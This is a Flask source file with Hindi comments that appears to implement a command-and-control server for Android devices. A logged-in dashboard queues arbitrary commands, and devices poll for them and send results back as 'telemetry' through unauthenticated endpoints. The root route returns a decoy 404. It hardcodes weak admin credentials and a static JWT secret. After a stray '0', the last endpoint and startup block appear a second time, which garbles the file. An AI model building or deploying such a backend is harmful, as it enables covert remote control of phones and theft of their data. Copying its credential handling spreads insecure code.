import jwt
import datetime
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Cross-Origin Requests को अनुमति देने के लिए

# Secret Key और Admin Credentials
app.config['SECRET_KEY'] = 'SUPER_SECRET_STRONG_KEY_12345'
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "password123"

# इन-मेमोरी स्टोरेज (कमांड्स और रिजल्ट्स के लिए)
pending_commands = {}
device_telemetry_results = {}

# --- Authentication Decorator ---
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({"status": "error", "message": "Token is missing!"}), 401
        try:
            if token.startswith("Bearer "):
                token = token.split(" ")[1]
            jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        except Exception:
            return jsonify({"status": "error", "message": "Invalid or expired token!"}), 401
        return f(*args, **kwargs)
    return decorated

# --- 1. Root Route ---
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "error",
        "message": "Access Denied. Resource Not Found."
    }), 404

# --- 2. Login Endpoint (डैशबोर्ड के लिए) ---
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"status": "error", "message": "Username and Password required"}), 400
    
    if data['username'] == ADMIN_USERNAME and data['password'] == ADMIN_PASSWORD:
        token = jwt.encode({
            'user': data['username'],
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
        }, app.config['SECRET_KEY'], algorithm="HS256")
        
        return jsonify({
            "status": "success",
            "message": "Login successful",
            "token": token
        }), 200
    
    return jsonify({"status": "error", "message": "Invalid Credentials"}), 401

# --- 3. Command Execution Endpoint (डैशबोर्ड से कमांड भेजने के लिए) ---
@app.route('/api/execute', methods=['POST'])
@token_required
def execute_command():
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({"status": "error", "message": "No command provided"}), 400
    
    command = data.get('command')
    device_id = data.get('device_id', 'DEFAULT_DEVICE')
    
    # कमांड को पेंडिंग queue में सेव करना ताकि ऐप इसे ले सके
    pending_commands[device_id] = command

    return jsonify({
        "status": "success",
        "command_executed": command,
        "target_device": device_id,
        "message": "Command queued successfully.",
        "timestamp": str(datetime.datetime.now())
    }), 200

# --- 4. Android App Command Fetch Endpoint (आपके लॉग्स के अनुसार सही राउट) ---
@app.route('/api/v1/command/fetch', methods=['GET'])
def fetch_command():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    cmd = pending_commands.get(device_id, "none")
    
    # एक बार कमांड भेजने के बाद उसे क्लियर कर देना
    if cmd != "none":
        pending_commands[device_id] = "none"

    return jsonify({
        "cmd": cmd,
        "status": "success"
    }), 200

# --- 5. Android App Telemetry / Result Post Endpoint (आपके लॉग्स के अनुसार सही राउट) ---
@app.route('/api/v1/telemetry', methods=['POST'])
def post_telemetry():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
        
    device_id = data.get('device_id', 'DEFAULT_DEVICE')
    cmd = data.get('cmd', 'Unknown')
    result_data = data.get('result', {})
    
    # रिजल्ट को स्टोर करना ताकि डैशबोर्ड इसे दिखा सके
    device_telemetry_results[device_id] = {
        "command": cmd,
        "result": result_data,
        "timestamp": str(datetime.datetime.now())
    }

    return jsonify({
        "status": "success",
        "message": "Telemetry received successfully"
    }), 200

# --- 6. Fetch Latest Result Endpoint (डैशबोर्ड पर आउटपुट दिखाने के लिए) ---
@app.route('/api/get-latest-result', methods=['GET'])
@token_required
def get_latest_result():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    result = device_telemetry_results.get(device_id, {"info": "Awaiting device telemetry data..."})
    return jsonify({
        "status": "success",
        "data": result
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
0

# --- 6. Fetch Latest Result Endpoint (डैशबोर्ड पर रिजल्ट दिखाने के लिए) ---
@app.route('/api/get-latest-result', methods=['GET'])
@token_required
def get_latest_result():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    result = device_telemetry_results.get(device_id, {"info": "No recent telemetry data found."})
    return jsonify({
        "status": "success",
        "data": result
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
